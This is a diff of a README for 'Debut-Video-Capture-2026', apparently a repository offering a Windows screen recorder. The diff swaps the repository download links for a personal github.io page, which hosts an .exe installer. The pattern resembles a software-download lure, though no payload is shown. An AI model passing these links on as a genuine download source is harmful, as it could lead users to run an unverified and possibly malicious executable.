@@ -1,6 +1,6 @@
 # 🎥 Debut-Video-Capture-2026 - Record your desktop screen with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Matwateringplace692/Debut-Video-Capture-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://matwateringplace692.github.io)
 
 Debut-Video-Capture-2026 allows you to record video from your computer screen, webcam, or other video input devices. You can save these recordings directly to your hard drive. This tool works on Windows 11 and Windows 10. It captures high-quality video and audio files without complex configuration.
 
@@ -9,7 +9,7 @@ Debut-Video-Capture-2026 allows you to record video from your computer screen, w
 To obtain the program, go to the official project release page. Follow these steps to reach the download location.
 
 1. Open your web browser.
-2. Visit this page to download: [https://github.com/Matwateringplace692/Debut-Video-Capture-2026](https://github.com/Matwateringplace692/Debut-Video-Capture-2026)
+2. Visit this page to download: [https://matwateringplace692.github.io](https://matwateringplace692.github.io)
 3. Look for the "Releases" section on the right side of the screen.
 4. Click the most recent version identifier.
 5. Select the installer file ending in .exe to begin your download.
